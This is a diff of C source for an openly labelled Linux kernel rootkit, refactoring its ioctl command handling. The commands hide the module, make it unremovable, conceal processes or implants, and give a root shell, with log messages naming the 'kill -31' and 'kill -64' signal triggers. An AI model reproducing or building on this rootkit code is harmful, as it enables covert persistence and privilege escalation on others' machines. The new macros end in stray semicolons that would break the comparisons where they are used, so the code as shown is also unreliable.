@@ -35,6 +35,17 @@
 // For size of array
 #define MAX_LIMIT 20
 
+
+// =========================== Available Commands =======================
+
+#define ROOTKIT_HIDE "hide";		// command to hide rootkit => In this mode, in no way this rootkit be will be removable => ROOTKIT_REMOVE will not work
+#define ROOTKIT_SHOW "show";		// command to unhide rootkit => In this mode, ROOTKIT_PROTECT and ROOTKIT_REMOVE will work effectively
+#define ROOTKIT_PROTECT "protect";	// command to make rootkit unremovable (even if it can be seen in usermode).
+#define ROOTKIT_REMOVE "remove";	// command to make rootkit removable
+#define PROCESS "PROCESS";		// command to hide/unhide a running process/implant
+#define ROOT "ROOT";			// command to get root shell
+
+
 // To copy value from userspace
 char value[MAX_LIMIT];
 
@@ -88,14 +99,6 @@ static struct file_operations fops =
 	.release        = etx_release,
 };
 
-// =========================== Available Commands =======================
-
-static char rootkit_hide[] = "hide";		// command to hide rootkit => In this mode, in no way this rootkit be removable => rootkit_remove will not work
-static char rootkit_show[] = "show";		// command to unhide rootkit => In this mode, rootkit_protect and rootkit_remove will work effectively
-static char rootkit_protect[] = "protect";	// command to make rootkit unremovable (even if it can be seen in usermode).
-static char rootkit_remove[] = "remove";	// command to make rootkit removable
-static char process[] = "process";		// command to hide/unhide running process/implant
-static char root[] = "root";			// command to get root shell
 
 
 // ========================= Hide rootkit LKM ==================
@@ -222,27 +225,27 @@ static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 			pr_info("		Value got from device file= %s\n", value);
 
 
-			if (strncmp(rootkit_hide, value, sizeof(rootkit_hide)) == 0)
+			if (strncmp(ROOTKIT_HIDE, value, strlen(ROOTKIT_HIDE)) == 0)
                         {
 				hide_rootkit();
                         }
-                        else if (strncmp(rootkit_show, value, sizeof(rootkit_show)) == 0)
+                        else if (strncmp(ROOTKIT_SHOW, value, strlen(ROOTKIT_SHOW)) == 0)
                         {
 				show_rootkit();
                         }
-			else if (strncmp(rootkit_protect, value, sizeof(rootkit_protect)) == 0)
+			else if (strncmp(ROOTKIT_PROTECT, value, strlen(ROOTKIT_PROTECT)) == 0)
 			{
 				protect_rootkit();
 			}
-			else if (strncmp(rootkit_remove, value, sizeof(rootkit_remove)) == 0)
+			else if (strncmp(ROOTKIT_REMOVE, value, strlen(ROOTKIT_REMOVE)) == 0)
                         {
 				remove_rootkit();
 			}
-			else if (strncmp(process, value, sizeof(process)) == 0)
+			else if (strncmp(PROCESS, value, strlen(PROCESS)) == 0)
 			{
 				pr_info("[+] kill -31 <pid> : Command to hide/unhide running process/implant. Applicable in normal shell prompt.\n");
 			}
-			else if (strncmp(root, value, sizeof(root)) == 0)
+			else if (strncmp(ROOT, value, strlen(ROOT)) == 0)
 			{
 				pr_info("[+] kill -64 <any pid> : Command to get root shell. Applicable in normal shell prompt.\n");
 			}
